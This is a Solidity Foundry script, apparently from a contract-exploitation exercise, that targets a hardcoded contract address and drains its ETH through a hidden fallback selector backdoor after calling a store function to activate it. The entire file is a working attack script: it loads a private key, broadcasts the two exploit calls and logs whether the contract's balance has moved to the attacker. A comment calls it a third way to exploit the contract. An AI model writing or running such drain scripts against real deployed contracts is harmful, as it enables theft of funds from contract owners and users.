// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title HiddenSelectorDrain
 * @dev Script to attack the contract using the hidden selector backdoor.
 * This script targets the fallback selector drain described in the decompiled contract.
 * This was a third way to exploit the contract.
 */
contract HiddenSelectorDrain is Script {
    address constant TARGET_CONTRACT = 0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC;
    // The hidden selector as bytes4 (see decompiled code)
    bytes4 constant HIDDEN_SELECTOR = 0xb5d09fae;
    bytes4 constant STORE_SELECTOR = 0x7408a1d7;

    function run() external {
        uint256 attackerKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerKey);
        console.log("Attacker address:", attacker);
        console.log("Target contract:", TARGET_CONTRACT);
        console.log("Attempting to trigger hidden selector drain...");

        uint256 initialBalance = attacker.balance;
        uint256 contractBalance = TARGET_CONTRACT.balance;
        console.log("Initial contract balance:", contractBalance);
        console.log("Initial attacker balance:", initialBalance);

        if (contractBalance == 0) {
            console.log("Contract already empty.");
            return;
        }

        vm.startBroadcast(attackerKey);

        // --- Step 0: Solve the puzzle to enable the store function (but it was already done in the FinalDrainScript) ---
        // --- Step 1: Call store() to activate the contract ---
        console.log("Step 1: Calling store('status', 1) to activate drain mechanism...");
        (bool storeSuccess, ) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(STORE_SELECTOR, "status", uint256(1))
        );
        require(storeSuccess, "Failed to call store function.");
        console.log("-> Drain mechanism activated successfully.");

        // --- Step 2: Call the contract with only the hidden selector as calldata ---
        (bool success, bytes memory data) = TARGET_CONTRACT.call(abi.encodePacked(HIDDEN_SELECTOR));
        vm.stopBroadcast();

        if (success) {
            console.log("SUCCESS: Hidden selector drain executed!");
        } else {
            console.log("FAIL: Hidden selector drain failed.");
        }

        uint256 finalBalance = attacker.balance;
        uint256 finalContractBalance = TARGET_CONTRACT.balance;
        console.log("Final contract balance:", finalContractBalance);
        console.log("Final attacker balance:", finalBalance);
        if (finalContractBalance == 0 && finalBalance > initialBalance) {
            console.log("Attack successful: funds drained.");
        } else {
            console.log("Attack failed or contract still has funds.");
        }
    }
}
